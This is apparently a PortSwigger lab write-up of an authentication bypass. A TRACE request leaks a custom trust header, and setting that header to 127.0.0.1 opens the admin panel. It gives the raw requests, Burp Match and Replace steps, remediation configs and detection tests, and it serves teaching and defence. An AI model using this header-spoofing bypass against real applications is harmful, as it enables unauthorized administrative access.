# Authentication Bypass via Information Disclosure  
**Category**: 07-Identification and Authentication Failures (OWASP Top 10 A07:2025)  
**Secondary**: 06-Security Misconfiguration + Information Disclosure  
**Lab_ID**: AUTH-BYPASS-Info-Disclosure-001  
**Source**: PortSwigger Web Security Academy  
**Date_Completed**: 2025-11-22  
**Tag**: `Authentication-Bypass`, `Information-Disclosure`, `Custom-Header`, `Localhost-Check`, `TRACE-Method`, `IP-Spoofing`

---
## Executive summary
The administration panel (`/admin`) is meant to be restricted to administrator users or requests originating from localhost (`127.0.0.1`).  
Due to overly verbose error messaging and the HTTP TRACE method being enabled, an attacker can discover that the application trusts a non-standard header `X-Custom-IP-Authorization` for IP-based access control.  
By simply adding `X-Custom-IP-Authorization: 127.0.0.1` to any request, an unauthenticated (or low-privileged) user can impersonate localhost and completely bypass authentication to the admin panel.

**Result:**  
Unauthenticated/low-priv user → discover header via TRACE → add `X-Custom-IP-Authorization: 127.0.0.1` → access `/admin` → delete user `carlos` → lab solved.

**Severity (subjective):** Critical — full authentication bypass using only information disclosure and a single custom header.

**Recommended immediate action:**  
- Disable TRACE method server-wide.  
- Remove or properly validate the `X-Custom-IP-Authorization` header.  
- Never implement security controls based on easily spoofable headers.

---
## Objective
Discover the hidden custom header used for localhost authorisation, bypass authentication, access the admin panel at `/admin`, and delete the user `carlos`.

---
## Environment & tools
- Target: PortSwigger lab instance (e.g., `0a3b004c04f28a6e81ab2a3c0087001d.web-security-academy.net`)  
- Account used: `wiener:peter` (optional – works unauthenticated too)  
- Tools: Burp Suite (Repeater + Match and Replace)

---
## Discovery
1. Sent `GET /admin` → received message indicating the panel is restricted to administrators or local requests.  
2. Changed method to `TRACE /admin` → server echoed the full request, including an automatically added header:  
   ```
   X-Custom-IP-Authorization: <my-real-public-IP>
   ```
3. Realised the application uses this header (instead of the real source IP) to decide whether the request comes from localhost.

> Finding: The server itself leaks the name of its custom trust header via the TRACE method — textbook information disclosure leading to complete auth bypass.

---
## Reproduction steps
1. In Burp Repeater, send:
   ```
   TRACE /admin HTTP/1.1
   Host: <lab-id>.web-security-academy.net
   ```
2. Observe response contains:
   ```
   X-Custom-IP-Authorization: 203.0.113.42   ← your real IP
   ```
3. In Burp Proxy → Options → Match and Replace → Add new rule:
   - Type: Request header  
   - Match: (leave empty)  
   - Replace: `X-Custom-IP-Authorization: 127.0.0.1`
4. Enable the rule.  
5. Browse normally to the homepage or directly to `/admin`.  
6. Admin panel is now accessible → click “Delete” next to user `carlos` → lab solved.

**Captured TRACE request & response (key part):**
```
TRACE /admin HTTP/1.1
Host: 0a3b004c04f28a6e81ab2a3c0087001d.web-security-academy.net
```

Response:
```
HTTP/1.1 200 OK
...
X-Custom-IP-Authorization: 203.0.113.42
TRACE /admin HTTP/1.1

**After adding Match & Replace rule, normal request becomes:**
```
GET /admin HTTP/1.1
Host: 0a3b004c04f28a6e81ab2a3c0087001d.web-security-academy.net
X-Custom-IP-Authorization: 127.0.0.1     ← injected
Cookie: session=...
```

→ Admin panel loads successfully.

---
## Observed impact
- Complete authentication bypass for the admin interface.  
 Arbitrary user deletion (carlos) demonstrated.  
 Works without any valid credentials.

---
## Root cause analysis
- Primary cause: Security control relies on a client-controllable header (`X-Custom-IP-Authorization`).  
- Contributing factors:  
  - HTTP TRACE method enabled (information disclosure).  
  - Verbose error messages hinting at local-only access.  
  - No server-side validation of actual source IP.

---
## Risk assessment
- Likelihood: High (TRACE is often enabled by default; header name trivially discoverable)  
- Impact: Critical (full admin access)  
- Overall risk: Critical (CVSS ≈ 9.8 – AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

---
## Remediation
### Immediate / short-term
1. Disable TRACE method:
   ```apache
   TraceEnable Off        # Apache
   ```
   ```nginx
   if ($request_method = TRACE) { return 405; }
   ```
2. Remove or ignore `X-Custom-IP-Authorization` header completely.

### Medium-term
1. Replace flawed check with proper mechanisms:
   ```java
   if (!"127.0.0.1".equals(request.getRemoteAddr()) && !isAdmin(session)) {
       forbid();
   }
   ```
2. Add strict IP check using `X-Forwarded-For` only if behind a trusted proxy (and validate it).

### Long-term / defensive controls
- Disable all unused HTTP methods (TRACE, TRACK, OPTIONS, etc.).  
- Implement “deny by default” for admin paths.  
- Add automated checks for dangerous headers and methods in CI/CD.

---
## Detection & verification guidance
- Send TRACE to any endpoint → must return 405/403, never 200 with echoed headers.  
- Scan for usage of custom “IP-Authorization” headers in code.  
- DAST rule: any response containing `X-Custom-IP-Authorization` → critical alert.

---
## Suggested tests to add
- `TRACE /` → 405 Method Not Allowed  
- `GET /admin` with `X-Custom-IP-Authorization: 127.0.0.1` → 403/404 (header ignored)  
- Only real localhost (or proper admin session) can access `/admin`

---
## References & further reading
- OWASP Top 10 (2025) – A07: Identification and Authentication Failures  
- OWASP Cheat Sheet: Authentication  
- OWASP Cheat Sheet: HTTP TRACE / TRACK Methods  
- PortSwigger: Authentication bypass via information disclosure

---
## Evidence & validation (screenshots placeholders)

**Screenshot 1 – Normal GET /admin (access denied + hint)**  
<img width="718" height="341" alt="image" src="https://github.com/user-attachments/assets/481749e2-4b79-4e95-81df-91ccec5607ca" />


**Screenshot 2 – TRACE /admin response revealing X-Custom-IP-Authorization header**  
<img width="715" height="343" alt="image" src="https://github.com/user-attachments/assets/a7bcee25-4d22-4234-b7e7-fcdee9aefed7" />

**Screenshot 3 – Match & Replace rule adding 127.0.0.1 header**  
<img width="665" height="440" alt="Screenshot 2025-12-02 124326" src="https://github.com/user-attachments/assets/8d50e95c-fb3a-46ad-90c9-eb905c407a1a" />

**Screenshot 4 – Admin panel accessible + carlos deleted**  
<img width="949" height="473" alt="Screenshot 2025-12-02 124154" src="https://github.com/user-attachments/assets/4cc140d7-60d8-4374-a832-096be1d8ba44" />

**Screenshot 5 – Lab solved confirmation**  
<img width="948" height="440" alt="Screenshot 2025-12-02 124230" src="https://github.com/user-attachments/assets/50bcbb27-b19d-4190-9b8c-df6b6f87e9d2" />

---
> **Legal & ethical reminder:** This write-up documents testing performed in a controlled PortSwigger lab environment. Do not apply these techniques to real systems without explicit authorization.
